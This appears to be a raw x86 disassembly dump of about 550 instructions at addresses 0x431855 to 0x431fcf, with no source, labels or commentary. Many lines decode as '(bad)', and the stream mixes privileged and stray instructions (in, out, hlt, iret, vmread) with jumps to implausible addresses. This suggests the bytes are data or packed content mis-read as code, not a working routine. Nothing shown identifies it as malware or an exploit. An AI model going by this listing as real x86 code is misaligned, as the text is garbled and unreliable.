  431855:	out    0x45,eax
  431857:	add    BYTE PTR [eax],cl
  431859:	cmp    ebx,0xffffff8c
  43185c:	jge    0x43185e
  43185e:	jb     0x431870
  431860:	je     0x5218e0
  431866:	pop    edx
  431867:	push   esi
  431868:	mov    ecx,DWORD PTR [edi]
  43186a:	in     al,dx
  43186b:	rol    DWORD PTR [ebp+0x0],1
  43186e:	or     DWORD PTR [ebx+0xfb8c08],0x4d
  431875:	cmp    DWORD PTR [ecx],0xfffffff0
  431878:	hlt    
  431879:	mov    esp,DWORD PTR [eax+0xf034d2b]
  43187f:	(bad)  
  431881:	push   eax
  431882:	jns    0xb842fd00
  431888:	lock push cs
  43188a:	ror    edx,0x3
  43188d:	test   BYTE PTR [ecx+0x5500e800],cl
  431893:	dec    eax
  431894:	rcpps  xmm4,XMMWORD PTR [ecx+0x4d]
  431898:	(bad)  
  431899:	mov    esi,0x7f33ff5f
  43189e:	inc    eax
  43189f:	test   DWORD PTR [edx],eax
  4318a1:	je     0x431863
  4318a3:	mov    ecx,ecx
  4318a5:	adc    DWORD PTR [ebp-0xc],0xffffffec
  4318a9:	and    eax,DWORD PTR [eax+0xf0103]
  4318af:	jp     0x43189d
  4318b1:	rcpps  xmm3,XMMWORD PTR [edx-0x25]
  4318b5:	add    edx,DWORD PTR [edi+0x74]
  4318b8:	sbb    BYTE PTR [ebp+0x4d001484],cl
  4318be:	add    BYTE PTR [ebp-0x74c48bbb],al
  4318c4:	je     0x431849
  4318c6:	cmp    eax,edi
  4318c8:	js     0x4318ed
  4318ca:	add    eax,0xeb0fc003
  4318cf:	jns    0x43185c
  4318d1:	vmread DWORD PTR [ecx+0x45],ebx
  4318d5:	add    ecx,DWORD PTR [ebx+0x508d1c74]
  4318db:	adc    al,0x8b
  4318dd:	jge    0x4318f3
  4318df:	mov    edi,DWORD PTR [eax-0x4]
  4318e2:	add    edi,DWORD PTR [edi]
  4318e4:	or     bh,bh
  4318e6:	push   ebp
  4318e7:	push   es
  4318e8:	mov    DWORD PTR [ebp-0x4],ebx
  4318eb:	add    edi,esi
  4318ed:	pop    es
  4318ee:	add    esi,DWORD PTR [edi-0x48ccf183]
  4318f4:	mov    DWORD PTR [esp+esi*8],ecx
  4318f7:	inc    ebp
  4318f8:	pop    ebp
  4318f9:	xor    DWORD PTR [esi-0x4],0x3b
  4318fd:	add    edx,DWORD PTR [ecx+edi*1]
  431900:	push   es
  431901:	clc    
  431902:	mov    bh,0xdb
  431904:	jp     0x4318bd
  431906:	add    cl,BYTE PTR [esi]
  431908:	div    DWORD PTR [edi+0x4d8b0c1c]
  43190e:	test   edi,edi
  431910:	je     0x431906
  431912:	mov    eax,ecx
  431914:	or     BYTE PTR [ebx],al
  431916:	dec    BYTE PTR [ecx+0x7d3bec7d]
  43191c:	jbe    0x431990
  43191e:	mov    ecx,DWORD PTR [ebx-0x488017f4]
  431924:	add    ecx,DWORD PTR [esi]
  431926:	cmp    DWORD PTR [edi+0x45fe0cf8],esi
  43192c:	add    eax,DWORD PTR [ebx-0x287af783]
  431932:	je     0x431981
  431934:	mov    DWORD PTR [ecx],edi
  431936:	mov    esi,eax
  431938:	hlt    
  431939:	or     BYTE PTR [ecx+0x7dfff4ff],0x5b
  431940:	jb     0x431902
  431942:	jmp    0x43192f
  431944:	xor    esi,DWORD PTR [ebx]
  431946:	pop    edi
  431947:	pop    esi
  431948:	pop    ebx
  431949:	ret    
  43194a:	ret    0x8b
  43194d:	mov    ecx,DWORD PTR [ebx+0x2c008390]
  431953:	xor    DWORD PTR ds:0x89339c0c,0x56
  43195a:	cld    
  43195b:	cmp    DWORD PTR [ebp+0xf],eax
  43195e:	xor    al,0x85
  431960:	pushf  
  431961:	add    BYTE PTR [ebx+0x4d0cfc8b],cl
  431967:	ret    
  431968:	mov    edi,DWORD PTR [esi-0x4]
  43196b:	pop    eax
  43196c:	dec    ebp
  43196d:	jne    0x4318fa
  43196f:	xor    edi,esp
  431971:	inc    eax
  431972:	dec    ebp
  431973:	jbe    0x4319c8
  431975:	inc    eax
  431976:	pop    ebp
  431977:	add    edx,DWORD PTR [esi+0x8]
  43197a:	push   ebx
  43197b:	dec    eax
  43197c:	push   ecx
  43197d:	mov    eax,edi
  43197f:	and    al,0xf0
  431981:	jo     0x43196e
  431983:	mov    eax,DWORD PTR [ebx]
  431985:	sbb    BYTE PTR [ebp+0x4d],cl
  431988:	mov    eax,DWORD PTR [ebx]
  43198a:	nop
  43198b:	or     BYTE PTR [eax],al
  43198d:	jne    0x4319e6
  43198f:	cmp    ebx,DWORD PTR [edx+0x33893277]
  431995:	cld    
  431996:	xor    edi,edi
  431998:	add    edi,DWORD PTR [ebp+0x3]
  43199b:	cmp    DWORD PTR [ecx+0xbcfe8fc],ecx
  4319a1:	js     0x431927
  4319a3:	jae    0x4319a7
  4319a5:	(bad)  
  4319a7:	xor    al,0x5d
  4319a9:	jmp    0x431936
  4319ab:	mov    ecx,DWORD PTR [ecx*4+0x33dfb1de]
  4319b2:	fdecstp 
  4319b4:	test   BYTE PTR [edi],ah
  4319b6:	add    bh,BYTE PTR [ebp+0x0]
  4319b9:	add    ebx,DWORD PTR [ebp-0x77]
  4319bc:	mov    edi,eax
  4319be:	cmp    al,0x0
  4319c1:	adc    dh,BYTE PTR [ebx]
  4319c3:	jge    0x4319c8
  4319c5:	mov    edi,DWORD PTR [ebx]
  4319c7:	jl     0x4319d8
  4319c9:	clc    
  4319ca:	dec    edi
  4319cb:	jge    0x4319cd
  4319cd:	mov    eax,DWORD PTR [ebx]
  4319cf:	jb     0x4319d9
  4319d1:	mov    ecx,DWORD PTR [ebp-0x8]
  4319d4:	mov    edi,edi
  4319d6:	xor    edx,DWORD PTR [eax]
  4319d8:	add    edi,DWORD PTR [ebx]
  4319da:	mov    DWORD PTR [ebp-0x10],edi
  4319dd:	inc    edi
  4319de:	pop    ebp
  4319df:	jge    0x431a1c
  4319e1:	cmp    esi,DWORD PTR [esp+edi*8-0x75]
  4319e5:	mov    edx,0xc05d87f0
  4319ea:	imul   ebx,DWORD PTR [esi+0x14],0xffffffc9
  4319ee:	fimul  WORD PTR [eax]
  4319f0:	fist   WORD PTR [ebp+0x1c]
  4319f3:	in     al,dx
  4319f4:	jne    0x4319e2
  4319f6:	mov    edi,DWORD PTR [edx-0x7a27a10]
  4319fc:	imul   edx,DWORD PTR [ebp+0x14],0xffffffc7
  431a00:	fdivp  st(0),st
  431a02:	fild   WORD PTR [ebp+0x4510f85c]
  431a08:	test   BYTE PTR [ebx+0x4d00fc02],cl
  431a0e:	inc    ebp
  431a0f:	mov    ecx,DWORD PTR [ebx+0x454dfcfc]
  431a15:	mov    ebp,DWORD PTR [ebx-0x4]
  431a18:	adc    al,0x8b
  431a1a:	rcl    DWORD PTR [eax],0x48
  431a1d:	mov    esi,0x7080803
  431a22:	fiadd  WORD PTR [ebp+0x4d]
  431a25:	(bad)  
  431a26:	mov    edx,DWORD PTR [edx-0x4]
  431a29:	mov    edx,DWORD PTR [ebp-0x4]
  431a2c:	xor    ebx,DWORD PTR [ebx+0x330103]
  431a32:	mov    DWORD PTR [edi+0x872dc],edi
  431a38:	xlat   BYTE PTR ds:[ebx]
  431a39:	into   
  431a3a:	ffreep st(6)
  431a3c:	retf   0x6c7
  431a3f:	iret   
  431a40:	dec    ebp
  431a41:	inc    ebp
  431a42:	mov    DWORD PTR [ebx],edi
  431a44:	fmul   QWORD PTR [edi]
  431a46:	dec    ebp
  431a47:	jnp    0x431a7c
  431a49:	add    BYTE PTR [ebx],al
  431a4b:	mov    ecx,DWORD PTR [esp+edi*8]
  431a4e:	inc    ebp
  431a4f:	dec    ebp
  431a50:	lea    esi,[ebx]
  431a52:	add    DWORD PTR [ebx],eax
  431a54:	jb     0x431a91
  431a56:	add    BYTE PTR [edi],cl
  431a58:	inc    ebp
  431a59:	imul   eax,edi,0x858bd800
  431a5f:	cld    
  431a60:	clc    
  431a61:	mov    DWORD PTR [ebp+0x0],eax
  431a64:	inc    DWORD PTR [eax]
  431a66:	or     al,0xde
  431a68:	sbb    bh,0x1
  431a6b:	retf   
  431a6c:	add    BYTE PTR [eax+edx*1+0x33004d02],al
  431a73:	dec    ebp
  431a74:	add    ecx,DWORD PTR [ecx-0x250b2b77]
  431a7a:	enter  0x12de,0xdf
  431a7e:	inc    ebp
  431a7f:	pop    ebp
  431a80:	dec    DWORD PTR [ebx-0x257f0ff4]
  431a86:	add    DWORD PTR [edx],edx
  431a88:	add    BYTE PTR [ebp+0x50],dl
  431a8b:	mov    ecx,DWORD PTR [ecx+0x45d2f4fc]
  431a91:	xor    ecx,DWORD PTR [ebx+eax*1+0xac73966]
  431a98:	loopne 0x431ab1
  431a9a:	cdq    
  431a9b:	push   ebp
  431a9c:	clc    
  431a9d:	mov    eax,DWORD PTR [ebp-0x4]
  431aa0:	xor    edx,edx
  431aa2:	add    esi,DWORD PTR [ebx]
  431aa4:	cmp    eax,DWORD PTR [ebx]
  431aa6:	hlt    
  431aa7:	cmp    DWORD PTR [ebx],esp
  431aa9:	or     al,BYTE PTR [ebp+0xf]
  431aac:	mov    eax,DWORD PTR [edx]
  431aae:	loopne 0x431ab0
  431ab0:	(bad)  
  431ab1:	mov    ecx,esi
  431ab3:	cld    
  431ab4:	pushf  
  431ab5:	pop    ebp
  431ab6:	call   0x10c0:0x8bf0328b
  431abd:	add    eax,DWORD PTR [eax+0x10018b]
  431ac3:	dec    ebp
  431ac4:	iret   
  431ac5:	xor    ebp,DWORD PTR [edi+0x50e45189]
  431acb:	dec    ebp
  431acc:	mov    ecx,DWORD PTR [ebx-0x31390304]
  431ad2:	(bad)  
  431ad3:	iret   
  431ad4:	inc    ebp
  431ad5:	(bad)  
  431ad6:	jne    0x431b25
  431ad8:	mov    ecx,DWORD PTR [ebx+0x3c603d8]
  431ade:	(bad)  
  431adf:	cmp    ebx,eax
  431ae1:	je     0x431a69
  431ae3:	add    edi,edi
  431ae5:	or     bh,bh
  431ae7:	dec    ebp
  431ae8:	inc    ebp
  431ae9:	mov    esi,DWORD PTR [ebx]
  431aeb:	cld    
  431aec:	add    ecx,esi
  431aee:	cmp    ecx,DWORD PTR [eax-0xc]
  431af1:	mov    edx,DWORD PTR [edi]
  431af3:	or     BYTE PTR [ebp-0x7c],al
  431af6:	mov    ebx,DWORD PTR [edx-0x7639cd18]
  431afc:	test   BYTE PTR [edx+ebx*4],cl
  431aff:	inc    ebp
  431b00:	xor    bh,BYTE PTR [eax]
  431b02:	mov    DWORD PTR [eax+ebp*8+0x10ef8b],ebx
  431b09:	jne    0x431ad2
  431b0b:	mov    ebp,esp
  431b0d:	fcomp  DWORD PTR [ebx]
  431b0f:	add    BYTE PTR [ecx],al
  431b11:	inc    DWORD PTR [ebp-0x75]
  431b14:	(bad)  
  431b15:	cld    
  431b16:	add    al,0xce
  431b18:	mov    ecx,edi
  431b1a:	cld    
  431b1b:	inc    ebp
  431b1c:	fidivr WORD PTR [ebx]
  431b1e:	fbstp  TBYTE PTR [ebp-0x3e]
  431b21:	mov    eax,DWORD PTR [eax]
  431b23:	adc    BYTE PTR [ebx-0x3974038b],cl
  431b29:	fadd   st,st(7)
  431b2b:	add    BYTE PTR [ebp-0x1],al
  431b2e:	mov    ecx,DWORD PTR [esp+edi*8]
  431b31:	inc    ebp
  431b32:	mov    bh,0xc7
  431b35:	loopne 0x431b7c
  431b37:	sbb    ecx,DWORD PTR [ebx+0x4545fc7f]
  431b3d:	sbb    al,0x33
  431b3f:	pushf  
  431b40:	add    ecx,DWORD PTR [ebx-0x398b03c5]
  431b46:	mov    eax,edi
  431b48:	cwde   
  431b49:	inc    ebp
  431b4a:	inc    ebp
  431b4b:	jne    0x431ad8
  431b4d:	mov    esp,esp
  431b4f:	clc    
  431b50:	add    al,0x4d
  431b52:	mov    DWORD PTR [ebx],esi
  431b54:	or     al,0x33
  431b56:	inc    ebp
  431b57:	lea    ecx,[ebx-0x398d13fd]
  431b5d:	add    bh,al
  431b5f:	inc    ebp
  431b60:	ror    DWORD PTR [ebx+0x45d829],0x8b
  431b67:	add    ebp,esp
  431b69:	shufps xmm1,xmm3,0xc7
  431b6d:	(bad)  
  431b6e:	jmp    0x74885697
  431b73:	xor    ecx,DWORD PTR [ebx+0x453bec03]
  431b79:	hlt    
  431b7a:	mov    ecx,DWORD PTR [edi]
  431b7c:	fadd   DWORD PTR [ebp+0x0]
  431b7f:	xor    ecx,DWORD PTR [edi]
  431b81:	add    ecx,ecx
  431b83:	cmp    edi,edi
  431b85:	pmuludq mm7,QWORD PTR [edx+0x50]
  431b89:	(bad)  
  431b8a:	jmp    0x431b17
  431b8c:	mov    edi,esp
  431b8e:	or     al,0xc6
  431b90:	inc    ebp
  431b91:	(bad)  
  431b92:	mov    eax,DWORD PTR [ebp+0x10]
  431b95:	jne    0x431b20
  431b97:	mov    eax,DWORD PTR [ecx]
  431b99:	clc    
  431b9a:	add    BYTE PTR [ebp-0x40],cl
  431b9d:	xor    edx,DWORD PTR [eax-0x73]
  431ba0:	jne    0x431ba3
  431ba2:	push   DWORD PTR [edx+0x8]
  431ba5:	add    BYTE PTR [ebp+0x45],al
  431ba8:	mov    ebp,ecx
  431baa:	cld    
  431bab:	add    BYTE PTR [ebp+0x0],cl
  431bae:	xor    eax,DWORD PTR [ebp+0x3]
  431bb1:	lea    edi,[ebx]
  431bb3:	adc    cl,BYTE PTR [ebx+0x110cf8c7]
  431bb9:	sub    eax,0x5d330e4d
  431bbe:	lea    esi,[ebx]
  431bc0:	add    DWORD PTR [ebx],eax
  431bc2:	jb     0x431bad
  431bc4:	add    BYTE PTR [eax],al
  431bc6:	inc    ebp
  431bc7:	add    bl,ch
  431bc9:	inc    ebp
  431bca:	mov    esi,DWORD PTR [ebx]
  431bcc:	or     al,0x3
  431bce:	(bad)  
  431bcf:	mov    edi,eax
  431bd1:	in     al,dx
  431bd2:	scas   eax,DWORD PTR es:[edi]
  431bd3:	inc    ebp
  431bd4:	mov    esi,DWORD PTR [ebx]
  431bd6:	in     al,0x3
  431bd8:	add    al,0x89
  431bda:	mov    ecx,DWORD PTR [eax+edi*8]
  431bdd:	dec    ebp
  431bde:	(bad)  
  431bdf:	mov    ebx,DWORD PTR [esp+ebx*8-0x30cd3166]
  431be6:	mov    ecx,eax
  431be8:	cld    
  431be9:	push   es
  431bea:	dec    ebp
  431beb:	add    al,0x33
  431bed:	mov    DWORD PTR [ebx],eax
  431bef:	in     al,dx
  431bf0:	cmp    DWORD PTR [ebp-0x67],eax
  431bf3:	mov    eax,DWORD PTR [ebp-0xba0068]
  431bf9:	mov    edx,DWORD PTR [ebp-0x4]
  431bfc:	mov    ecx,DWORD PTR [ebp-0x2c]
  431bff:	xor    eax,DWORD PTR [ebp+0x3]
  431c02:	cmp    DWORD PTR [ebx],0x8b327499
  431c08:	xor    edi,esp
  431c0a:	jmp    0xff77195c
  431c0f:	add    ecx,DWORD PTR [ebp-0x3f]
  431c12:	xor    ebx,DWORD PTR [edi]
  431c14:	add    eax,ecx
  431c16:	cmp    ebx,DWORD PTR [eax]
  431c18:	mov    ecx,DWORD PTR [ebp-0x4]
  431c1b:	mov    ecx,DWORD PTR [eax]
  431c1d:	adc    BYTE PTR [ebp-0x80],al
  431c20:	jmp    0x431c23
  431c22:	mov    eax,DWORD PTR [eax]
  431c24:	cld    
  431c25:	mov    bh,0xc6
  431c27:	push   ecx
  431c28:	(bad)  
  431c29:	jne    0x431c89
  431c2b:	dec    ecx
  431c2d:	or     BYTE PTR [ecx+ebx*1],cl
  431c30:	push   ebp
  431c31:	inc    ebp
  431c32:	in     al,dx
  431c33:	add    ebp,esp
  431c35:	or     bh,al
  431c37:	dec    ebp
  431c38:	cld    
  431c39:	mov    eax,DWORD PTR [ebp+0x4500f8d8]
  431c3f:	xor    DWORD PTR [edx+eax*1],0xffffff9c
  431c43:	dec    DWORD PTR [ebx+0x45510cf4]
  431c49:	mov    DWORD PTR [ebx+0x5345fc0c],ecx
  431c4f:	mov    edx,DWORD PTR [ecx+0xc]
  431c52:	xor    eax,esi
  431c54:	mov    edx,0xc172c7
  431c59:	inc    ebp
  431c5a:	mov    esi,DWORD PTR [ebp+0x8]
  431c5d:	mov    eax,edx
  431c5f:	call   0x84c7e354
  431c64:	add    DWORD PTR [edx-0x76bace00],ebx
  431c6a:	mov    ebp,eax
  431c6c:	or     BYTE PTR [eax],dl
  431c6e:	jo     0x431cbd
  431c70:	push   edi
  431c71:	xor    esi,DWORD PTR [ebp+0x3]
  431c74:	(bad)  
  431c75:	pmulhuw mm0,mm1
  431c78:	test   DWORD PTR [ebp-0x8],ecx
  431c7b:	mov    DWORD PTR [ebp-0x67],eax
  431c7e:	mov    eax,DWORD PTR [ebp-0x4]
  431c81:	xor    edi,DWORD PTR [ebp-0x73]
  431c84:	xor    eax,DWORD PTR [ebx]
  431c86:	xor    esi,DWORD PTR [edx+0x3]
  431c89:	add    BYTE PTR [ecx],bh
  431c8b:	inc    ebp
  431c8c:	(bad)  
  431c8d:	mov    edx,DWORD PTR [ebp-0x7b39fe1c]
  431c93:	mov    DWORD PTR [eax],0x750f0004
  431c99:	sub    ecx,DWORD PTR [ebx-0x7974f701]
  431c9f:	lock add BYTE PTR [ebp+0x0],cl
  431ca3:	mov    esi,DWORD PTR [ebp-0x18]
  431ca6:	mov    ebp,edx
  431ca8:	or     al,0x72
  431caa:	ja     0x431cac
  431cac:	mov    edx,esi
  431cae:	cld    
  431caf:	(bad)  
  431cb2:	cli    
  431cb3:	mov    esi,DWORD PTR [ebp-0x4]
  431cb6:	cmp    ecx,esi
  431cb8:	bswap  edi
  431cba:	(bad)
  431cbe:	mov    esi,DWORD PTR [ebp-0x4]
  431cc1:	mov    esi,ecx
  431cc3:	clc    
  431cc4:	repnz add esi,DWORD PTR [ebp+0x45]
  431cc8:	push   ebx
  431cc9:	xor    eax,DWORD PTR [ebp+0x3]
  431ccc:	cmp    bl,BYTE PTR [edi-0x64]
  431ccf:	pop    ebx
  431cd0:	jmp    0x431d97
  431cd5:	mov    esi,DWORD PTR [ebp-0x7d]
  431cd8:	xor    ebp,DWORD PTR [eax]
  431cda:	lea    eax,[ebp-0x8]
  431cdd:	xor    eax,0xc7ef9cf2
  431ce2:	neg    eax
  431ce4:	ins    DWORD PTR es:[edi],dx
  431ce5:	test   esi,edi
  431ce7:	clc    
  431ce8:	pop    esp
  431ce9:	inc    ebp
  431cea:	or     BYTE PTR [ecx+0x450f0c7d],cl
  431cf0:	xor    edi,DWORD PTR [ecx+0x70f08e6]
  431cf6:	add    cl,al
  431cf8:	jne    0x431c94
  431cfa:	mov    esi,DWORD PTR [edx]
  431cfc:	in     al,dx
  431cfd:	push   esi
  431cfe:	xor    BYTE PTR [ebp-0xe],dh
  431d01:	add    edi,esi
  431d03:	cmp    esi,DWORD PTR [edi+0xc21c10f]
  431d09:	add    cl,bh
  431d0b:	mov    edi,DWORD PTR [ebp+0x8]
  431d0e:	mov    DWORD PTR [ebp-0x14],esi
  431d11:	add    esi,DWORD PTR [ebp+0x3c]
  431d14:	mov    ecx,DWORD PTR [ecx+0x45f10c08]
  431d1a:	mov    ah,0x38
  431d1c:	call   0xe0e4:0x898b329c
  431d23:	jne    0x431d9a
  431d25:	mov    ecx,DWORD PTR [ebx-0xe0e13f4]
  431d2b:	shl    edx,0xf2
  431d2e:	(bad)  
  431d2f:	mov    ah,0x16
  431d31:	dec    eax
  431d32:	jne    0x431cc7
  431d34:	mov    ecx,DWORD PTR [edi]
  431d36:	in     al,dx
  431d37:	jmp    0x431d2a
  431d39:	add    dl,dh
  431d3b:	mov    edi,esi
  431d3d:	or     al,0x8
  431d3f:	inc    ebp
  431d40:	jne    0x431d45
  431d42:	mov    esp,DWORD PTR [eax-0x74c1ff24]
  431d48:	ret    
  431d49:	or     bh,bh
  431d4b:	jge    0x431d35
  431d4d:	sub    ebx,DWORD PTR [edi+0x17d5d34]
  431d53:	xor    edi,eax
  431d55:	add    esi,DWORD PTR [ebp-0x77]
  431d58:	mov    ebx,esp
  431d5a:	clc    
  431d5b:	neg    DWORD PTR [ebp-0x7c]
  431d5e:	xor    eax,DWORD PTR [eax]
  431d60:	cmp    eax,DWORD PTR [eax]
  431d62:	repz jne 0x431cfa
  431d65:	xor    eax,DWORD PTR [ecx]
  431d67:	add    ebx,DWORD PTR [eax]
  431d69:	mov    DWORD PTR [ebp-0x8],eax
  431d6c:	mov    eax,edi
  431d6e:	cld    
  431d6f:	lock pop eax
  431d71:	test   DWORD PTR [ebx],esi
  431d73:	clc    
  431d74:	add    edx,DWORD PTR [edi-0x740bff77]
  431d7a:	fdivp  st(4),st
  431d7c:	test   ecx,esi
  431d7e:	(bad)  
  431d7f:	jnp    0x431d80
  431d81:	add    ecx,DWORD PTR [ebx-0x14c4272f]
  431d87:	jae    0x431d14
  431d89:	sub    edi,esp
  431d8b:	(bad)  
  431d8c:	shl    DWORD PTR [eax-0x3e],0x89
  431d90:	leave  
  431d91:	call   0x8198d49e
  431d96:	in     al,dx
  431d97:	(bad)  
  431d98:	in     al,dx
  431d99:	add    bh,al
  431d9b:	mov    esp,edi
  431d9d:	in     al,dx
  431d9e:	test   DWORD PTR [ebp-0x8],edi
  431da1:	mov    eax,DWORD PTR [ebp+0x2b]
  431da4:	xor    al,0x3
  431da6:	pushf  
  431da7:	jnp    0x573219e0
  431dad:	xor    edx,DWORD PTR [ebx-0x77]
  431db0:	push   ecx
  431db1:	loopne 0x431de6
  431db3:	jne    0x431d70
  431db5:	mov    esi,DWORD PTR [edx-0x20]
  431db8:	add    BYTE PTR [ebp-0x3d],bh
  431dbb:	xor    eax,DWORD PTR [ebp-0x73]
  431dbe:	mov    edi,DWORD PTR [esi]
  431dc0:	cld    
  431dc1:	jb     0x431d89
  431dc3:	add    bl,al
  431dc5:	jne    0x431e0c
  431dc7:	mov    edx,DWORD PTR [edi-0x10]
  431dca:	jge    0x431e49
  431dcc:	mov    esi,DWORD PTR [ebx]
  431dce:	lock add ecx,DWORD PTR [ebp+0x3b]
  431dd2:	xor    esi,DWORD PTR [ebp-0x77]
  431dd5:	mov    esi,eax
  431dd7:	lock inc ebp
  431dd9:	jge    0x431e10
  431ddb:	xor    ebx,DWORD PTR [ebx+eax*1+0x75f83b8b]
  431de2:	dec    ebp
  431de3:	mov    esi,DWORD PTR [ebx]
  431de5:	loopne 0x431d70
  431de7:	jge    0x431de1
  431de9:	add    DWORD PTR [ebp-0x7d],eax
  431dec:	cmc    
  431ded:	add    bl,BYTE PTR [ebp+ecx*2-0x740b8a75]
  431df4:	dec    ebp
  431df5:	hlt    
  431df6:	xor    ebx,DWORD PTR [ebp-0x77]
  431df9:	mov    esi,esp
  431dfb:	in     al,0x45
  431dfd:	jge    0x431e38
  431dff:	mov    ebx,DWORD PTR [esp+ecx*1-0x43130e75]
  431e06:	dec    ebp
  431e07:	dec    esp
  431e08:	xor    edx,DWORD PTR [ebx+0x3ec7389]
  431e0e:	inc    ebp
  431e0f:	hlt    
  431e10:	xor    eax,0xb88b9f75
  431e15:	add    al,0x95
  431e17:	icebp  
  431e18:	add    dl,dh
  431e1a:	mov    DWORD PTR [ebp+0x20],ebx
  431e1d:	cmp    eax,DWORD PTR [ebp+0xf]
  431e20:	test   DWORD PTR [edi+ecx*1-0x1],edx
  431e24:	fistp  WORD PTR [ebx+0x0]
  431e27:	inc    ebp
  431e28:	mov    ebx,DWORD PTR [edi+0xc]
  431e2b:	add    eax,eax
  431e2d:	inc    ebp
  431e2e:	test   BYTE PTR [ebx],dh
  431e30:	add    eax,DWORD PTR [ebx]
  431e32:	add    BYTE PTR [esi+0x45],bl
  431e35:	ret    0x85
  431e38:	jnp    0x5443a207
  431e3e:	inc    bp
  431e40:	inc    ebp
  431e41:	xor    eax,0xc78a9cb9
  431e46:	add    ah,bl
  431e48:	xor    eax,DWORD PTR [ebp+0x453bf8b9]
  431e4e:	add    BYTE PTR [ebx+0x3],dl
  431e51:	mov    esi,0x708088b
  431e56:	cmp    esi,eax
  431e58:	setp   BYTE PTR [ecx-0x74fcffce]
  431e5f:	mov    esp,edi
  431e61:	call   0x33ce63b3
  431e66:	or     BYTE PTR [ebx],al
  431e68:	inc    ecx
  431e69:	mov    DWORD PTR [ecx+0x408b0ce0],ecx
  431e6f:	and    BYTE PTR [ebp-0x7074f0bb],al
  431e75:	lock add cl,al
  431e78:	mov    DWORD PTR [ebp-0x2c],0xf8f08581
  431e7f:	mov    ch,0x45
  431e81:	clc    
  431e82:	xor    eax,DWORD PTR [ebp+0x3]
  431e85:	mov    ecx,DWORD PTR [ecx+0x45c1d4f8]
  431e8b:	inc    ebp
  431e8c:	mov    eax,DWORD PTR [ecx-0x7aff0770]
  431e92:	mov    edi,eax
  431e94:	mov    eax,DWORD PTR [ebp+0x3c]
  431e97:	mov    ecx,DWORD PTR [eax]
  431e99:	hlt    
  431e9a:	inc    ebp
  431e9b:	ror    DWORD PTR [ebx+0x818c45],0xf4
  431ea2:	mov    eax,DWORD PTR [ebp+0x45e4f889]
  431ea8:	push   ebp
  431ea9:	mov    edi,DWORD PTR [ebx]
  431eab:	in     al,dx
  431eac:	jne    0x431e6f
  431eae:	mov    eax,DWORD PTR [ebp-0x28]
  431eb1:	add    DWORD PTR [eax],0xe8058dec
  431eb7:	clc    
  431eb8:	mov    esi,DWORD PTR [edi-0x8]
  431ebb:	add    dh,dl
  431ebd:	rol    WORD PTR [ebp-0x1],cl
  431ec1:	mov    edx,DWORD PTR [eax+0x8]
  431ec4:	jne    0x431e86
  431ec6:	inc    DWORD PTR [esp+ebx*1-0x74ffb2fd]
  431ecd:	inc    ebp
  431ece:	push   esp
  431ecf:	test   DWORD PTR [ecx+0xf],ecx
  431ed2:	sub    edx,esp
  431ed4:	add    eax,DWORD PTR [eax]
  431ed6:	and    BYTE PTR [ebx-0x3fc4e7b0],cl
  431edc:	add    BYTE PTR [ebx+ecx*4-0x78ffdffd],al
  431ee3:	mov    eax,DWORD PTR [ecx]
  431ee5:	and    BYTE PTR [eax],al
  431ee7:	cmp    dl,BYTE PTR [eax]
  431ee9:	add    BYTE PTR [ebp+0x66],al
  431eec:	inc    ecx
  431eee:	push   esp
  431eef:	add    BYTE PTR [ebp+0x0],dh
  431ef2:	push   edx
  431ef3:	enterw 0xc1,0x4d
  431ef8:	mov    esp,DWORD PTR [esi+0x20]
  431efb:	add    DWORD PTR [ecx-0x7b],eax
  431efe:	add    eax,DWORD PTR [ebx]
  431f00:	str    WORD PTR [eax+0x45]
  431f04:	lea    ecx,[ebx+0x45890801]
  431f0a:	sbb    BYTE PTR [ebx],al
  431f0c:	dec    ebp
  431f0d:	cmp    al,0xf
  431f0f:	inc    ebp
  431f10:	push   eax
  431f11:	mov    esi,DWORD PTR [ebx]
  431f13:	push   eax
  431f14:	add    eax,eax
  431f16:	mov    DWORD PTR [esp+ecx*1-0x7bff2efd],eax
  431f1d:	inc    ebp
  431f1e:	add    BYTE PTR ds:0x8b4d8c00,dh
  431f24:	xor    edx,esp
  431f26:	add    eax,esi
  431f28:	mov    ebx,eax
  431f2a:	loopne 0x431f71
  431f2c:	dec    ebp
  431f2d:	mov    ecx,DWORD PTR [edi]
  431f2f:	cld    
  431f30:	push   eax
  431f31:	xchg   DWORD PTR [ebx],esi
  431f33:	add    DWORD PTR [ebx],ebp
  431f35:	add    BYTE PTR [ebx],ch
  431f37:	or     BYTE PTR [ecx],bh
  431f39:	dec    ecx
  431f3a:	loopne 0x431f3f
  431f3c:	xchg   DWORD PTR [ebx-0x78ff0400],ecx
  431f42:	push   ebp
  431f43:	add    DWORD PTR [ebx+0x55100800],eax
  431f49:	dec    ebp
  431f4a:	jmp    0x431ed5
  431f4c:	mov    esp,DWORD PTR [eax]
  431f4e:	sbb    dl,dl
  431f50:	inc    eax
  431f51:	xor    ecx,DWORD PTR [ebp+0x4501ff87]
  431f57:	add    BYTE PTR [ebx+0x74528555],cl
  431f5d:	push   ebp
  431f5e:	div    DWORD PTR [ebx]
  431f60:	and    eax,DWORD PTR [ebx]
  431f62:	add    edx,DWORD PTR [edx-0x30]
  431f65:	jno    0x431ef2
  431f67:	inc    DWORD PTR [eax+eiz*1]
  431f6a:	inc    ebp
  431f6b:	push   eax
  431f6c:	push   eax
  431f6d:	mov    esp,DWORD PTR [edi-0x74beff1c]
  431f73:	mov    edi,esp
  431f75:	push   eax
  431f76:	inc    ebp
  431f77:	enter  0x458b,0x8
  431f7b:	push   ecx
  431f7c:	(bad)  
  431f7d:	call   0x10d2955
  431f82:	pop    ss
  431f83:	push   ebp
  431f84:	mov    ecx,DWORD PTR [ebx+0x489408]
  431f8a:	mov    ecx,DWORD PTR [ecx+0xc458b04]
  431f90:	push   ecx
  431f91:	jo     0x431f7b
  431f93:	inc    DWORD PTR [edi]
  431f95:	or     BYTE PTR [eax],al
  431f97:	call   0xce26e1
  431f9c:	fmul   QWORD PTR [ebp+0x55]
  431f9f:	mov    eax,DWORD PTR [ebx-0x313ed7c4]
  431fa5:	mov    bh,0x8c
  431fa7:	adc    al,0x9a
  431fa9:	dec    esp
  431faa:	xor    bl,BYTE PTR [eax]
  431fac:	mov    ecx,DWORD PTR [ebp+0xc]
  431faf:	mov    eax,DWORD PTR [ebp-0x4]
  431fb2:	mov    esi,DWORD PTR [edi-0x3148f924]
  431fb8:	push   es
  431fb9:	retf   
  431fba:	mov    BYTE PTR [ebp-0x30],0x3b
  431fbe:	inc    ebp
  431fbf:	movntps XMMWORD PTR [eax-0x741fff77],xmm5
  431fc6:	retf   0x83fc
  431fc9:	into   
  431fca:	dec    ebp
  431fcb:	retf   
  431fcc:	mov    ecx,DWORD PTR [ebp-0x74]
  431fcf:	mov    eax,DWORD PTR [eax]
